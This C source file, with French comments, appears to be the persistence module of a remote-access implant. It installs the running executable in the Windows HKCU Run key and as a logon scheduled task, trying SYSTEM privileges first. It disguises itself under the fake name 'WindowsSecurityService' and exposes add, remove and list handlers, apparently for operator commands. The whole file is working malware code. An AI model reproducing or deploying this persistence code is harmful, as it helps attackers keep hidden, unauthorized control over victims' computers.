/*
 * persist.c - Implémentation des mécanismes de persistence
 */

#include "persist.h"
#include "../../utils/memory.h"
#include "../../utils/strings.h"

/* Nom utilisé pour la persistence */
#define PERSIST_NAME "WindowsSecurityService"

/*
 * Récupère le chemin de l'exécutable courant.
 */
static bool get_current_exe_path(char *buffer, size_t buffer_size) {
  DWORD len = GetModuleFileNameA(NULL, buffer, (DWORD)buffer_size);
  return len > 0 && len < buffer_size;
}

/*
 * Persistence via la clé Run du registre.
 */
static int persist_registry_add(void) {
  char exe_path[MAX_PATH_LEN];
  if (!get_current_exe_path(exe_path, sizeof(exe_path))) {
    return STATUS_FAILURE;
  }

  HKEY hkey;
  LONG result = RegOpenKeyExA(
      HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
      KEY_SET_VALUE, &hkey);

  if (result != ERROR_SUCCESS) {
    return STATUS_FAILURE;
  }

  result = RegSetValueExA(hkey, PERSIST_NAME, 0, REG_SZ, (BYTE *)exe_path,
                          (DWORD)strlen(exe_path) + 1);

  RegCloseKey(hkey);

  return result == ERROR_SUCCESS ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * Supprime la persistence registry.
 */
static int persist_registry_remove(void) {
  HKEY hkey;
  LONG result = RegOpenKeyExA(
      HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
      KEY_SET_VALUE, &hkey);

  if (result != ERROR_SUCCESS) {
    return STATUS_FAILURE;
  }

  result = RegDeleteValueA(hkey, PERSIST_NAME);
  RegCloseKey(hkey);

  return result == ERROR_SUCCESS ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * Persistence via tâche planifiée.
 */
static int persist_schtask_add(void) {
  char exe_path[MAX_PATH_LEN];
  if (!get_current_exe_path(exe_path, sizeof(exe_path))) {
    return STATUS_FAILURE;
  }

  /* Construit la commande schtasks */
  char cmd[1024];
  snprintf(
      cmd, sizeof(cmd),
      "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /ru SYSTEM /f 2>nul",
      PERSIST_NAME, exe_path);

  /* Essaie d'abord en SYSTEM (nécessite admin) */
  int result = system(cmd);

  if (result != 0) {
    /* Fallback en user mode */
    snprintf(cmd, sizeof(cmd),
             "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /f 2>nul",
             PERSIST_NAME, exe_path);
    result = system(cmd);
  }

  return result == 0 ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * Supprime la tâche planifiée.
 */
static int persist_schtask_remove(void) {
  char cmd[512];
  snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f 2>nul",
           PERSIST_NAME);

  int result = system(cmd);
  return result == 0 ? STATUS_SUCCESS : STATUS_FAILURE;
}

int handler_persist_add(const char *type) {
  if (!type) {
    /* Par défaut: registry */
    return persist_registry_add();
  }

  if (str_icmp(type, "registry") == 0 || str_icmp(type, "reg") == 0) {
    return persist_registry_add();
  } else if (str_icmp(type, "schtask") == 0 || str_icmp(type, "task") == 0) {
    return persist_schtask_add();
  } else if (str_icmp(type, "all") == 0) {
    /* Les deux */
    int r1 = persist_registry_add();
    int r2 = persist_schtask_add();
    return (r1 == STATUS_SUCCESS || r2 == STATUS_SUCCESS) ? STATUS_SUCCESS
                                                          : STATUS_FAILURE;
  }

  return STATUS_FAILURE;
}

int handler_persist_remove(const char *type) {
  if (!type || str_icmp(type, "all") == 0) {
    persist_registry_remove();
    persist_schtask_remove();
    return STATUS_SUCCESS;
  }

  if (str_icmp(type, "registry") == 0 || str_icmp(type, "reg") == 0) {
    return persist_registry_remove();
  } else if (str_icmp(type, "schtask") == 0 || str_icmp(type, "task") == 0) {
    return persist_schtask_remove();
  }

  return STATUS_FAILURE;
}

int handler_persist_list(char **output, size_t *len) {
  if (!output || !len) {
    return STATUS_FAILURE;
  }

  char *buffer = (char *)malloc(512);
  if (!buffer) {
    return STATUS_NO_MEMORY;
  }

  bool has_registry = false;
  bool has_schtask = false;

  /* Check registry */
  HKEY hkey;
  if (RegOpenKeyExA(HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                    KEY_READ, &hkey) == ERROR_SUCCESS) {

    char value[MAX_PATH_LEN];
    DWORD value_size = sizeof(value);
    DWORD type;

    if (RegQueryValueExA(hkey, PERSIST_NAME, NULL, &type, (BYTE *)value,
                         &value_size) == ERROR_SUCCESS) {
      has_registry = true;
    }
    RegCloseKey(hkey);
  }

  /* Check schtask - on utilise schtasks /query */
  /* Pour l'instant on skip ce check, c'est lourd */

  snprintf(buffer, 512,
           "Persistence methods:\n"
           "  Registry (HKCU\\Run): %s\n"
           "  Scheduled Task: (check required)\n",
           has_registry ? "ACTIVE" : "not set");

  *output = buffer;
  *len = strlen(buffer);

  return STATUS_SUCCESS;
}
